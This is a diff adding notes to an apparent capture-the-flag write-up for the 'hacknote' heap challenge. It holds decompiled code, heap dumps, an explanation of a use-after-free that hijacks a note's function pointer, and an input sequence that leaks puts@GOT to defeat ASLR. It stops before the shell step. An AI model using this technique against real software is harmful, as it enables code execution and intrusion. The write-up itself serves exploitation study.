@@ -2,9 +2,19 @@
 ┌─────────────┬───────────────────────────[ hacknote Writeup ]──────────────────────────────────────────
 | Description |
 └─────────────┘
+Leverage pwninit to get the correct ld 
+wget -O pwninit https://github.com/io12/pwninit/releases/download/3.3.0/pwninit
+chmod +x pwninit
+./pwninit --bin hacknote --libc libc.so.6
+
+For debugging to find main - find entry point using info file
+x/20i <entry point>
+Look for the call <addr> (this is __libc_start_main)
+continue into it. the argument for main's addr is an arg
+
 Decompile
 
-main() {
+main() { 
   int iVar1;                                                 // choice input as integer
   int in_GS_OFFSET;
   char local_18 [4];                                         // choice input for read - char array
@@ -67,8 +77,8 @@ delete_note() {
     _exit(0);
   }
   if (*(int *)(&note_array + iVar1 * 4) != 0) {              // if note_array at index to delete is not null
-    free(*(void **)(*(int *)(&note_array + iVar1 * 4) + 4)); // free some funcptr
-    free(*(void **)(&note_array + iVar1 * 4));               // free some value
+    free(*(void **)(*(int *)(&note_array + iVar1 * 4) + 4)); // free note's funcptr
+    free(*(void **)(&note_array + iVar1 * 4));               // free note's value
     puts("Success");
   }
   if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {           // canary check
@@ -96,18 +106,18 @@ add_note() {
           puts("Alloca Error");
           exit(-1);
         }
-        **(undefined4 **)(&note_array + local_20 * 4) = FUN_0804862b;  // set allocated value to FUN_0804862b
+        **(undefined4 **)(&note_array + local_20 * 4) = FUN_0804862b;  // set allocated value note_array[local_20] to FUN_0804862b
         printf("Note size :");
         read(0,local_18,8);                                  // input of note size
         __size = atoi(local_18);                             // input of note size to integer __size
         iVar1 = *(int *)(&note_array + local_20 * 4);
         pvVar2 = malloc(__size);                             // allocate __size amount
-        *(void **)(iVar1 + 4) = pvVar2;                      // note_array[local_20] + 4 = pvVar (memory of __size)
+        *(void **)(iVar1 + 4) = pvVar2;                      // note_array[local_20] + 4 = pvVar (content pointer)
         if (*(int *)(*(int *)(&note_array + local_20 * 4) + 4) == 0) {  
           puts("Alloca Error");
           exit(-1);
         }
-        printf("Content :");                                 // read in content directly into note_array[local_20]+4
+        printf("Content :");                                 // read in content directly into *note_array[local_20]+4
         read(0,*(void **)(*(int *)(&note_array + local_20 * 4) + 4),__size);  
         puts("Success !");
         note_count = note_count + 1;
@@ -154,4 +164,65 @@ print_note() {
 └─────────┘
 Canary, NX, ASLR
 
+When a note is added, a note struct with two fields, 1st is funcptr (for printing) and 2nd is content buffer
+heap chunks after adding 2 notes with content size of 16 bytes
+Chunk(addr=0x804b008, size=0x10, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
+    [0x0804b008     2b 86 04 08 18 b0 04 08 00 00 00 00 19 00 00 00    +...............]
+Chunk(addr=0x804b018, size=0x18, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
+    [0x0804b018     41 41 41 0a 00 00 00 00 00 00 00 00 00 00 00 00    AAA.............]
+Chunk(addr=0x804b030, size=0x10, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
+    [0x0804b030     2b 86 04 08 40 b0 04 08 00 00 00 00 19 00 00 00    +...@...........]
+Chunk(addr=0x804b040, size=0x18, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
+    [0x0804b040     42 42 42 0a 00 00 00 00 00 00 00 00 00 00 00 00    BBB.............]
+Chunk(addr=0x804b058, size=0x20fb0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
+
+0x804b000:      0x00000000      0x00000011      0x0804862b      0x0804b018
+0x804b010:      0x00000000      0x00000019      0x0a414141      0x00000000
+0x804b020:      0x00000000      0x00000000      0x00000000      0x00000011
+0x804b030:      0x0804862b      0x0804b040      0x00000000      0x00000019
+0x804b040:      0x0a424242      0x00000000      0x00000000      0x00000000
+
+After notes 0 & 1 have been freed, the fastbins look as follows
+Fastbins[idx=0, size=0x10]  
+Chunk(addr=0x804b030, size=0x10, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) Note 1 
+Chunk(addr=0x804b008, size=0x10, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) Note 0 
+Fastbins[idx=1, size=0x18]
+Chunk(addr=0x804b040, size=0x18, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) Note 1 content
+Chunk(addr=0x804b018, size=0x18, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) Note 0 content
+
+By adding a 3rd note (note 2) and content of 8 bytes, 0x804b030 (Note 1) becomes Note 2 and 0x804b008 (Note 0) becomes Note 2 
+content. Because the pointers are not cleared UAF exists. Thus Note 2 content which we directly control allows us to directly
+affect Note 0 content - both the funcptr and the content buffer. Printing which calls the funcptr will therefore execute first 4 
+bytes of the content of Note 2.
+0x804b000:      0x00000000      0x00000011      0x43434343      0x0a434343
+0x804b010:      0x00000000      0x00000019      0x00000000      0x00000000
+0x804b020:      0x00000000      0x00000000      0x00000000      0x00000011
+0x804b030:      0x0804862b      0x0804b008      0x00000000      0x00000019
+
+The reason that there must be 2 Notes added before deleted is that the 0x10 fastbin must hold at least 2 chunks. 
+This is so that the first chunk when adding a note will be the note struct itself (funcptr, content ptr) and the 
+second chunk will be the note content. Specifically we need to manuevere allocation so that a note heap content points to
+the same address as the functpr.
+
+To beat ASLR and pop shell a leak is required for the address to system. Once again abusing UAF, Note 0 can be set so that
+the funcptr to print is the same while content is set to puts@GOT
+0804a024 puts@GLIBC_2.0
+0804862b print funcptr
+
+Input
+1
+16
+AAAA
+1
+16
+BBBB
+2
+0
+2
+1
+1
+8
+\x2b\x86\x04\x08\x24\xa0\x04\x08
+3
+0 
 
